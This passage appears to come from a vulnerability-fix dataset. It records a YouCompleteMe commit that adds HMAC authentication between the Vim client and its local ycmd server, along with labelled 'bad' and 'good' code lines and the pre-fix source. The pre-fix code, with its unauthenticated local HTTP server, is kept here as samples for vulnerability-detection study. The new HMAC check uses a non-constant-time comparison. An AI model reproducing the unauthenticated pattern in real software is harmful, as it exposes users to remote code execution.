],\n+                                    BaseRequest.hmac_secret ):\n+    raise RuntimeError( 'Received invalid HMAC for response!' )\n+  return True\n+\n def _BuildUri( handler ):\n   return urlparse.urljoin( BaseRequest.server_location, handler )\n \n@@ -163,7 +187,9 @@ def _CheckServerIsHealthyWithCache():\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n \ndiff --git a/python/ycm/server/hmac_plugin.py b/python/ycm/server/hmac_plugin.py\nnew file mode 100644\nindex 00000000..b433b2b0\n--- /dev/null\n+++ b/python/ycm/server/hmac_plugin.py\n@@ -0,0 +1,57 @@\n+#!/usr/bin/env python\n+#\n+# Copyright (C) 2014  Google Inc.\n+#\n+# This file is part of YouCompleteMe.\n+#\n+# YouCompleteMe is free software: you can redistribute it and/or modify\n+# it under the terms of the GNU General Public License as published by\n+# the Free Software Foundation, either version 3 of the License, or\n+# (at your option) any later version.\n+#\n+# YouCompleteMe is distributed in the hope that it will be useful,\n+# but WITHOUT ANY WARRANTY; without even the implied warranty of\n+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n+# GNU General Public License for more details.\n+#\n+# You should have received a copy of the GNU General Public License\n+# along with YouCompleteMe.  If not, see <http://www.gnu.org/licenses/>.\n+\n+import logging\n+import httplib\n+from bottle import request, response, abort\n+from ycm import utils\n+\n+_HMAC_HEADER = 'x-ycm-hmac'\n+\n+# This class implements the Bottle plugin API:\n+# http://bottlepy.org/docs/dev/plugindev.html\n+#\n+# We want to ensure that every request coming in has a valid HMAC set in the\n+# x-ycm-hmac header and that every response coming out sets such a valid header.\n+# This is to prevent security issues with possible remote code execution.\n+class HmacPlugin( object ):\n+  name = 'hmac'\n+  api = 2\n+\n+\n+  def __init__( self, hmac_secret ):\n+    self._hmac_secret = hmac_secret\n+    self._logger = logging.getLogger( __name__ )\n+\n+\n+  def __call__( self, callback ):\n+    def wrapper( *args, **kwargs ):\n+      body = request.body.read()\n+      if not utils.ContentHexHmacValid( body,\n+                                        request.headers[ _HMAC_HEADER ],\n+                                        self._hmac_secret ):\n+        self._logger.info( 'Dropping request with bad HMAC.' )\n+        abort( httplib.UNAUTHORIZED, 'Unauthorized, received bad HMAC.')\n+        return\n+      body = callback( *args, **kwargs )\n+      response.headers[ _HMAC_HEADER ] = utils.CreateHexHmac(\n+          body, self._hmac_secret )\n+      return body\n+    return wrapper\n+\ndiff --git a/python/ycm/server/ycmd.py b/python/ycm/server/ycmd.py\nindex 34e66172..64b0f07f 100755\n--- a/python/ycm/server/ycmd.py\n+++ b/python/ycm/server/ycmd.py\n@@ -27,10 +27,12 @@\n import waitress\n import signal\n import os\n+import base64\n from ycm import user_options_store\n from ycm import extra_conf_store\n from ycm import utils\n from ycm.server.watchdog_plugin import WatchdogPlugin\n+from ycm.server.hmac_plugin import HmacPlugin\n \n def YcmCoreSanityCheck():\n   if 'ycm_core' in sys.modules:\n@@ -103,6 +105,8 @@ def Main():\n   options = ( json.load( open( args.options_file, 'r' ) )\n               if args.options_file\n               else user_options_store.DefaultOptions() )\n+  utils.RemoveIfExists( args.options_file )\n+  hmac_secret = base64.b64decode( options[ 'hmac_secret' ] )\n   user_options_store.SetAll( options )\n \n   # This ensures that ycm_core is not loaded before extra conf\n@@ -126,6 +130,7 @@ def Main():\n   handlers.UpdateUserOptions( options )\n   SetUpSignalHandler(args.stdout, args.stderr, args.keep_logfiles)\n   handlers.app.install( WatchdogPlugin( args.idle_suicide_seconds ) )\n+  handlers.app.install( HmacPlugin( hmac_secret ) )\n   waitress.serve( handlers.app,\n                   host = args.host,\n                   port = args.port,\ndiff --git a/python/ycm/utils.py b/python/ycm/utils.py\nindex d9128716..095337c9 100644\n--- a/python/ycm/utils.py\n+++ b/python/ycm/utils.py\n@@ -25,6 +25,8 @@\n import socket\n import stat\n import json\n+import hmac\n+import hashlib\n from distutils.spawn import find_executable\n import subprocess\n import collections\n@@ -212,3 +214,11 @@ def SafePopen( *args, **kwargs ):\n   return subprocess.Popen( *args, **kwargs )\n \n \n+def ContentHexHmacValid( content, hmac, hmac_secret ):\n+  return hmac == CreateHexHmac( content, hmac_secret )\n+\n+\n+def CreateHexHmac( content, hmac_secret ):\n+  return hmac.new( hmac_secret,\n+                   msg = content,\n+                   digestmod = hashlib.sha256 ).hexdigest()\ndiff --git a/python/ycm/youcompleteme.py b/python/ycm/youcompleteme.py\nindex 448236eb..83849ce1 100644\n--- a/python/ycm/youcompleteme.py\n+++ b/python/ycm/youcompleteme.py\n@@ -22,6 +22,7 @@\n import tempfile\n import json\n import signal\n+import base64\n from subprocess import PIPE\n from ycm import vimsupport\n from ycm import utils\n@@ -58,6 +59,7 @@\n # Ctrl-C in Vim.\n signal.signal( signal.SIGINT, signal.SIG_IGN )\n \n+HMAC_SECRET_LENGTH = 16\n NUM_YCMD_STDERR_LINES_ON_CRASH = 30\n SERVER_CRASH_MESSAGE_STDERR_FILE = (\n   'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +\n@@ -80,16 +82,18 @@ def __init__( self, user_options ):\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n@@ -116,6 +120,7 @@ def _SetupServer( self ):\n \n       self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)\n       BaseRequest.server_location = 'http://localhost:' + str( server_port )\n+      BaseRequest.hmac_secret = hmac_secret\n \n     self._NotifyUserIfServerCrashed()\n \n@@ -148,7 +153,6 @@ def ServerPid( self ):\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n", "files": {"/python/ycm/client/base_request.py": {"changes": [{"diff": "\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n", "add": 14, "remove": 10, "filename": "/python/ycm/client/base_request.py", "badparts": ["        return BaseRequest.session.post( _BuildUri( handler ),", "                                        data = ToUtf8Json( data ),", "                                        headers = _HEADERS,", "                                        timeout = timeout )", "        return BaseRequest.session.get( _BuildUri( handler ),", "                                        headers = _HEADERS,", "                                        timeout = timeout )", "                              data = ToUtf8Json( data ),", "                              headers = _HEADERS )", "                             headers = _HEADERS )"], "goodparts": ["        sent_data = ToUtf8Json( data )", "        return BaseRequest.session.post(", "            _BuildUri( handler ),", "            data = sent_data,", "            headers = BaseRequest._ExtraHeaders( sent_data ),", "            timeout = timeout )", "        return BaseRequest.session.get(", "            _BuildUri( handler ),", "            headers = BaseRequest._ExtraHeaders(),", "            timeout = timeout )", "        sent_data = ToUtf8Json( data )", "                              data = sent_data,", "                              headers = BaseRequest._ExtraHeaders( sent_data ) )", "                             headers = BaseRequest._ExtraHeaders() )"]}, {"diff": "\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n ", "add": 3, "remove": 1, "filename": "/python/ycm/client/base_request.py", "badparts": ["    response = requests.get( _BuildUri( 'healthy' ) )"], "goodparts": ["    response = requests.get( _BuildUri( 'healthy' ),", "                             headers = BaseRequest._ExtraHeaders() )", "    _ValidateResponseObject( response )"]}], "source": "\n import vim import requests import urlparse from retries import retries from requests_futures.sessions import FuturesSession from ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor from ycm import vimsupport from ycm.utils import ToUtf8Json from ycm.server.responses import ServerError, UnknownExtraConf _HEADERS={'content-type': 'application/json'} _EXECUTOR=UnsafeThreadPoolExecutor( max_workers=30) _DEFAULT_TIMEOUT_SEC=30 class BaseRequest( object): def __init__( self): pass def Start( self): pass def Done( self): return True def Response( self): return{} @staticmethod def GetDataFromHandler( handler, timeout=_DEFAULT_TIMEOUT_SEC): return JsonFromFuture( BaseRequest._TalkToHandlerAsync( '', handler, 'GET', timeout)) @staticmethod def PostDataToHandler( data, handler, timeout=_DEFAULT_TIMEOUT_SEC): return JsonFromFuture( BaseRequest.PostDataToHandlerAsync( data, handler, timeout)) @staticmethod def PostDataToHandlerAsync( data, handler, timeout=_DEFAULT_TIMEOUT_SEC): return BaseRequest._TalkToHandlerAsync( data, handler, 'POST', timeout) @staticmethod def _TalkToHandlerAsync( data, handler, method, timeout=_DEFAULT_TIMEOUT_SEC): def SendRequest( data, handler, method, timeout): if method=='POST': return BaseRequest.session.post( _BuildUri( handler), data=ToUtf8Json( data), headers=_HEADERS, timeout=timeout) if method=='GET': return BaseRequest.session.get( _BuildUri( handler), headers=_HEADERS, timeout=timeout) @retries( 5, delay=0.5, backoff=1.5) def DelayedSendRequest( data, handler, method): if method=='POST': return requests.post( _BuildUri( handler), data=ToUtf8Json( data), headers=_HEADERS) if method=='GET': return requests.get( _BuildUri( handler), headers=_HEADERS) if not _CheckServerIsHealthyWithCache(): return _EXECUTOR.submit( DelayedSendRequest, data, handler, method) return SendRequest( data, handler, method, timeout) session=FuturesSession( executor=_EXECUTOR) server_location='http://localhost:6666' def BuildRequestData( start_column=None, query=None, include_buffer_data=True): line, column=vimsupport.CurrentLineAndColumn() filepath=vimsupport.GetCurrentBufferFilepath() request_data={ 'filetypes': vimsupport.CurrentFiletypes(), 'line_num': line, 'column_num': column, 'start_column': start_column, 'line_value': vim.current.line, 'filepath': filepath } if include_buffer_data: request_data[ 'file_data']=vimsupport.GetUnsavedAndCurrentBufferData() if query: request_data[ 'query']=query return request_data def JsonFromFuture( future): response=future.result() if response.status_code==requests.codes.server_error: _RaiseExceptionForData( response.json()) response.raise_for_status() if response.text: return response.json() return None def _BuildUri( handler): return urlparse.urljoin( BaseRequest.server_location, handler) SERVER_HEALTHY=False def _CheckServerIsHealthyWithCache(): global SERVER_HEALTHY def _ServerIsHealthy(): response=requests.get( _BuildUri( 'healthy')) response.raise_for_status() return response.json() if SERVER_HEALTHY: return True try: SERVER_HEALTHY=_ServerIsHealthy() return SERVER_HEALTHY except: return False def _RaiseExceptionForData( data): if data[ 'exception'][ 'TYPE']==UnknownExtraConf.__name__: raise UnknownExtraConf( data[ 'exception'][ 'extra_conf_file']) raise ServerError( '{0}:{1}'.format( data[ 'exception'][ 'TYPE'], data[ 'message'])) ", "sourceWithComments": "#!/usr/bin/env python\n#\n# Copyright (C) 2013  Google Inc.\n#\n# This file is part of YouCompleteMe.\n#\n# YouCompleteMe is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# YouCompleteMe is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with YouCompleteMe.  If not, see <http://www.gnu.org/licenses/>.\n\nimport vim\nimport requests\nimport urlparse\nfrom retries import retries\nfrom requests_futures.sessions import FuturesSession\nfrom ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor\nfrom ycm import vimsupport\nfrom ycm.utils import ToUtf8Json\nfrom ycm.server.responses import ServerError, UnknownExtraConf\n\n_HEADERS = {'content-type': 'application/json'}\n_EXECUTOR = UnsafeThreadPoolExecutor( max_workers = 30 )\n# Setting this to None seems to screw up the Requests/urllib3 libs.\n_DEFAULT_TIMEOUT_SEC = 30\n\nclass BaseRequest( object ):\n  def __init__( self ):\n    pass\n\n\n  def Start( self ):\n    pass\n\n\n  def Done( self ):\n    return True\n\n\n  def Response( self ):\n    return {}\n\n  # This method blocks\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def GetDataFromHandler( handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return JsonFromFuture( BaseRequest._TalkToHandlerAsync( '',\n                                                            handler,\n                                                            'GET',\n                                                            timeout ) )\n\n\n  # This is the blocking version of the method. See below for async.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def PostDataToHandler( data, handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return JsonFromFuture( BaseRequest.PostDataToHandlerAsync( data,\n                                                               handler,\n                                                               timeout ) )\n\n\n  # This returns a future! Use JsonFromFuture to get the value.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def PostDataToHandlerAsync( data, handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return BaseRequest._TalkToHandlerAsync( data, handler, 'POST', timeout )\n\n\n  # This returns a future! Use JsonFromFuture to get the value.\n  # |method| is either 'POST' or 'GET'.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def _TalkToHandlerAsync( data,\n                           handler,\n                           method,\n                           timeout = _DEFAULT_TIMEOUT_SEC ):\n    def SendRequest( data, handler, method, timeout ):\n      if method == 'POST':\n        return BaseRequest.session.post( _BuildUri( handler ),\n                                        data = ToUtf8Json( data ),\n                                        headers = _HEADERS,\n                                        timeout = timeout )\n      if method == 'GET':\n        return BaseRequest.session.get( _BuildUri( handler ),\n                                        headers = _HEADERS,\n                                        timeout = timeout )\n\n    @retries( 5, delay = 0.5, backoff = 1.5 )\n    def DelayedSendRequest( data, handler, method ):\n      if method == 'POST':\n        return requests.post( _BuildUri( handler ),\n                              data = ToUtf8Json( data ),\n                              headers = _HEADERS )\n      if method == 'GET':\n        return requests.get( _BuildUri( handler ),\n                             headers = _HEADERS )\n\n    if not _CheckServerIsHealthyWithCache():\n      return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n\n    return SendRequest( data, handler, method, timeout )\n\n\n  session = FuturesSession( executor = _EXECUTOR )\n  server_location = 'http://localhost:6666'\n\n\ndef BuildRequestData( start_column = None,\n                      query = None,\n                      include_buffer_data = True ):\n  line, column = vimsupport.CurrentLineAndColumn()\n  filepath = vimsupport.GetCurrentBufferFilepath()\n  request_data = {\n    'filetypes': vimsupport.CurrentFiletypes(),\n    'line_num': line,\n    'column_num': column,\n    'start_column': start_column,\n    'line_value': vim.current.line,\n    'filepath': filepath\n  }\n\n  if include_buffer_data:\n    request_data[ 'file_data' ] = vimsupport.GetUnsavedAndCurrentBufferData()\n  if query:\n    request_data[ 'query' ] = query\n\n  return request_data\n\n\ndef JsonFromFuture( future ):\n  response = future.result()\n  if response.status_code == requests.codes.server_error:\n    _RaiseExceptionForData( response.json() )\n\n  # We let Requests handle the other status types, we only handle the 500\n  # error code.\n  response.raise_for_status()\n\n  if response.text:\n    return response.json()\n  return None\n\n\ndef _BuildUri( handler ):\n  return urlparse.urljoin( BaseRequest.server_location, handler )\n\n\nSERVER_HEALTHY = False\n\ndef _CheckServerIsHealthyWithCache():\n  global SERVER_HEALTHY\n\n  def _ServerIsHealthy():\n    response = requests.get( _BuildUri( 'healthy' ) )\n    response.raise_for_status()\n    return response.json()\n\n  if SERVER_HEALTHY:\n    return True\n\n  try:\n    SERVER_HEALTHY = _ServerIsHealthy()\n    return SERVER_HEALTHY\n  except:\n    return False\n\n\ndef _RaiseExceptionForData( data ):\n  if data[ 'exception' ][ 'TYPE' ] == UnknownExtraConf.__name__:\n    raise UnknownExtraConf( data[ 'exception' ][ 'extra_conf_file' ] )\n\n  raise ServerError( '{0}: {1}'.format( data[ 'exception' ][ 'TYPE' ],\n                                        data[ 'message' ] ) )\n"}, "/python/ycm/youcompleteme.py": {"changes": [{"diff": "\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n", "add": 5, "remove": 3, "filename": "/python/ycm/youcompleteme.py", "badparts": ["    self._temp_options_filename = None", "      self._temp_options_filename = options_file.name", "      json.dump( dict( self._user_options ), options_file )"], "goodparts": ["      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )", "      options_dict = dict( self._user_options )", "      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )", "      json.dump( options_dict, options_file )"]}, {"diff": "\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n", "add": 0, "remove": 1, "filename": "/python/ycm/youcompleteme.py", "badparts": ["    utils.RemoveIfExists( self._temp_options_filename )"], "goodparts": []}], "source": "\n import os import vim import tempfile import json import signal from subprocess import PIPE from ycm import vimsupport from ycm import utils from ycm.diagnostic_interface import DiagnosticInterface from ycm.completers.all.omni_completer import OmniCompleter from ycm.completers.general import syntax_parse from ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype from ycm.client.ycmd_keepalive import YcmdKeepalive from ycm.client.base_request import BaseRequest, BuildRequestData from ycm.client.command_request import SendCommandRequest from ycm.client.completion_request import CompletionRequest from ycm.client.omni_completion_request import OmniCompletionRequest from ycm.client.event_notification import( SendEventNotificationAsync, EventNotification) from ycm.server.responses import ServerError try: from UltiSnips import UltiSnips_Manager USE_ULTISNIPS_DATA=True except ImportError: USE_ULTISNIPS_DATA=False os.environ['no_proxy']='127.0.0.1,localhost' signal.signal( signal.SIGINT, signal.SIG_IGN) NUM_YCMD_STDERR_LINES_ON_CRASH=30 SERVER_CRASH_MESSAGE_STDERR_FILE=( 'The ycmd server SHUT DOWN(restart with:YcmRestartServer). ' + 'Stderr(last{0} lines):\\n\\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH)) SERVER_CRASH_MESSAGE_SAME_STDERR=( 'The ycmd server SHUT DOWN(restart with:YcmRestartServer). ' ' check console output for logs!') SERVER_IDLE_SUICIDE_SECONDS=10800 class YouCompleteMe( object): def __init__( self, user_options): self._user_options=user_options self._user_notified_about_crash=False self._diag_interface=DiagnosticInterface( user_options) self._omnicomp=OmniCompleter( user_options) self._latest_completion_request=None self._latest_file_parse_request=None self._server_stdout=None self._server_stderr=None self._server_popen=None self._filetypes_with_keywords_loaded=set() self._temp_options_filename=None self._ycmd_keepalive=YcmdKeepalive() self._SetupServer() self._ycmd_keepalive.Start() def _SetupServer( self): server_port=utils.GetUnusedLocalhostPort() with tempfile.NamedTemporaryFile( delete=False) as options_file: self._temp_options_filename=options_file.name json.dump( dict( self._user_options), options_file) options_file.flush() args=[ utils.PathToPythonInterpreter(), _PathToServerScript(), '--port={0}'.format( server_port), '--options_file={0}'.format( options_file.name), '--log={0}'.format( self._user_options[ 'server_log_level']), '--idle_suicide_seconds={0}'.format( SERVER_IDLE_SUICIDE_SECONDS)] if not self._user_options[ 'server_use_vim_stdout']: filename_format=os.path.join( utils.PathToTempDir(), 'server_{port}_{std}.log') self._server_stdout=filename_format.format( port=server_port, std='stdout') self._server_stderr=filename_format.format( port=server_port, std='stderr') args.append('--stdout={0}'.format( self._server_stdout)) args.append('--stderr={0}'.format( self._server_stderr)) if self._user_options[ 'server_keep_logfiles']: args.append('--keep_logfiles') self._server_popen=utils.SafePopen( args, stdout=PIPE, stderr=PIPE) BaseRequest.server_location='http://localhost:' +str( server_port) self._NotifyUserIfServerCrashed() def _IsServerAlive( self): returncode=self._server_popen.poll() return returncode is None def _NotifyUserIfServerCrashed( self): if self._user_notified_about_crash or self._IsServerAlive(): return self._user_notified_about_crash=True if self._server_stderr: with open( self._server_stderr, 'r') as server_stderr_file: error_output=''.join( server_stderr_file.readlines()[ : -NUM_YCMD_STDERR_LINES_ON_CRASH]) vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE + error_output) else: vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR) def ServerPid( self): if not self._server_popen: return -1 return self._server_popen.pid def _ServerCleanup( self): if self._IsServerAlive(): self._server_popen.terminate() utils.RemoveIfExists( self._temp_options_filename) def RestartServer( self): vimsupport.PostVimMessage( 'Restarting ycmd server...') self._user_notified_about_crash=False self._ServerCleanup() self._SetupServer() def CreateCompletionRequest( self, force_semantic=False): if( not self.NativeFiletypeCompletionAvailable() and self.CurrentFiletypeCompletionEnabled() and self._omnicomp.ShouldUseNow()): self._latest_completion_request=OmniCompletionRequest( self._omnicomp) else: extra_data={} self._AddExtraConfDataIfNeeded( extra_data) if force_semantic: extra_data[ 'force_semantic']=True self._latest_completion_request=( CompletionRequest( extra_data) if self._IsServerAlive() else None) return self._latest_completion_request def SendCommandRequest( self, arguments, completer): if self._IsServerAlive(): return SendCommandRequest( arguments, completer) def GetDefinedSubcommands( self): if self._IsServerAlive(): return BaseRequest.PostDataToHandler( BuildRequestData(), 'defined_subcommands') else: return[] def GetCurrentCompletionRequest( self): return self._latest_completion_request def GetOmniCompleter( self): return self._omnicomp def NativeFiletypeCompletionAvailable( self): return any([ FiletypeCompleterExistsForFiletype( x) for x in vimsupport.CurrentFiletypes()]) def NativeFiletypeCompletionUsable( self): return( self.CurrentFiletypeCompletionEnabled() and self.NativeFiletypeCompletionAvailable()) def OnFileReadyToParse( self): self._omnicomp.OnFileReadyToParse( None) if not self._IsServerAlive(): self._NotifyUserIfServerCrashed() extra_data={} self._AddTagsFilesIfNeeded( extra_data) self._AddSyntaxDataIfNeeded( extra_data) self._AddExtraConfDataIfNeeded( extra_data) self._latest_file_parse_request=EventNotification( 'FileReadyToParse', extra_data) self._latest_file_parse_request.Start() def OnBufferUnload( self, deleted_buffer_file): if not self._IsServerAlive(): return SendEventNotificationAsync( 'BufferUnload', { 'unloaded_buffer': deleted_buffer_file}) def OnBufferVisit( self): if not self._IsServerAlive(): return extra_data={} _AddUltiSnipsDataIfNeeded( extra_data) SendEventNotificationAsync( 'BufferVisit', extra_data) def OnInsertLeave( self): if not self._IsServerAlive(): return SendEventNotificationAsync( 'InsertLeave') def OnCursorMoved( self): self._diag_interface.OnCursorMoved() def OnVimLeave( self): self._ServerCleanup() def OnCurrentIdentifierFinished( self): if not self._IsServerAlive(): return SendEventNotificationAsync( 'CurrentIdentifierFinished') def DiagnosticsForCurrentFileReady( self): return bool( self._latest_file_parse_request and self._latest_file_parse_request.Done()) def GetDiagnosticsFromStoredRequest( self, qflist_format=False): if self.DiagnosticsForCurrentFileReady(): diagnostics=self._latest_file_parse_request.Response() self._latest_file_parse_request=None if qflist_format: return vimsupport.ConvertDiagnosticsToQfList( diagnostics) else: return diagnostics return[] def UpdateDiagnosticInterface( self): if not self.DiagnosticsForCurrentFileReady(): return self._diag_interface.UpdateWithNewDiagnostics( self.GetDiagnosticsFromStoredRequest()) def ShowDetailedDiagnostic( self): if not self._IsServerAlive(): return try: debug_info=BaseRequest.PostDataToHandler( BuildRequestData(), 'detailed_diagnostic') if 'message' in debug_info: vimsupport.EchoText( debug_info[ 'message']) except ServerError as e: vimsupport.PostVimMessage( str( e)) def DebugInfo( self): if self._IsServerAlive(): debug_info=BaseRequest.PostDataToHandler( BuildRequestData(), 'debug_info') else: debug_info='Server crashed, no debug info from server' debug_info +='\\nServer running at:{0}'.format( BaseRequest.server_location) debug_info +='\\nServer process ID:{0}'.format( self._server_popen.pid) if self._server_stderr or self._server_stdout: debug_info +='\\nServer logfiles:\\n {0}\\n {1}'.format( self._server_stdout, self._server_stderr) return debug_info def CurrentFiletypeCompletionEnabled( self): filetypes=vimsupport.CurrentFiletypes() filetype_to_disable=self._user_options[ 'filetype_specific_completion_to_disable'] return not all([ x in filetype_to_disable for x in filetypes]) def _AddSyntaxDataIfNeeded( self, extra_data): if not self._user_options[ 'seed_identifiers_with_syntax']: return filetype=vimsupport.CurrentFiletypes()[ 0] if filetype in self._filetypes_with_keywords_loaded: return self._filetypes_with_keywords_loaded.add( filetype) extra_data[ 'syntax_keywords']=list( syntax_parse.SyntaxKeywordsForCurrentBuffer()) def _AddTagsFilesIfNeeded( self, extra_data): def GetTagFiles(): tag_files=vim.eval( 'tagfiles()') current_working_directory=os.getcwd() return[ os.path.join( current_working_directory, x) for x in tag_files] if not self._user_options[ 'collect_identifiers_from_tags_files']: return extra_data[ 'tag_files']=GetTagFiles() def _AddExtraConfDataIfNeeded( self, extra_data): def BuildExtraConfData( extra_conf_vim_data): return dict(( expr, vimsupport.VimExpressionToPythonType( expr)) for expr in extra_conf_vim_data) extra_conf_vim_data=self._user_options[ 'extra_conf_vim_data'] if extra_conf_vim_data: extra_data[ 'extra_conf_data']=BuildExtraConfData( extra_conf_vim_data) def _PathToServerScript(): dir_of_current_script=os.path.dirname( os.path.abspath( __file__)) return os.path.join( dir_of_current_script, 'server/ycmd.py') def _AddUltiSnipsDataIfNeeded( extra_data): if not USE_ULTISNIPS_DATA: return try: rawsnips=UltiSnips_Manager._snips( '', 1) except: return extra_data[ 'ultisnips_snippets']=[{ 'trigger': x.trigger, 'description': x.description } for x in rawsnips] ", "sourceWithComments": "#!/usr/bin/env python\n#\n# Copyright (C) 2011, 2012  Google Inc.\n#\n# This file is part of YouCompleteMe.\n#\n# YouCompleteMe is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# YouCompleteMe is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with YouCompleteMe.  If not, see <http://www.gnu.org/licenses/>.\n\nimport os\nimport vim\nimport tempfile\nimport json\nimport signal\nfrom subprocess import PIPE\nfrom ycm import vimsupport\nfrom ycm import utils\nfrom ycm.diagnostic_interface import DiagnosticInterface\nfrom ycm.completers.all.omni_completer import OmniCompleter\nfrom ycm.completers.general import syntax_parse\nfrom ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype\nfrom ycm.client.ycmd_keepalive import YcmdKeepalive\nfrom ycm.client.base_request import BaseRequest, BuildRequestData\nfrom ycm.client.command_request import SendCommandRequest\nfrom ycm.client.completion_request import CompletionRequest\nfrom ycm.client.omni_completion_request import OmniCompletionRequest\nfrom ycm.client.event_notification import ( SendEventNotificationAsync,\n                                            EventNotification )\nfrom ycm.server.responses import ServerError\n\ntry:\n  from UltiSnips import UltiSnips_Manager\n  USE_ULTISNIPS_DATA = True\nexcept ImportError:\n  USE_ULTISNIPS_DATA = False\n\n# We need this so that Requests doesn't end up using the local HTTP proxy when\n# talking to ycmd. Users should actually be setting this themselves when\n# configuring a proxy server on their machine, but most don't know they need to\n# or how to do it, so we do it for them.\n# Relevant issues:\n#  https://github.com/Valloric/YouCompleteMe/issues/641\n#  https://github.com/kennethreitz/requests/issues/879\nos.environ['no_proxy'] = '127.0.0.1,localhost'\n\n# Force the Python interpreter embedded in Vim (in which we are running) to\n# ignore the SIGINT signal. This helps reduce the fallout of a user pressing\n# Ctrl-C in Vim.\nsignal.signal( signal.SIGINT, signal.SIG_IGN 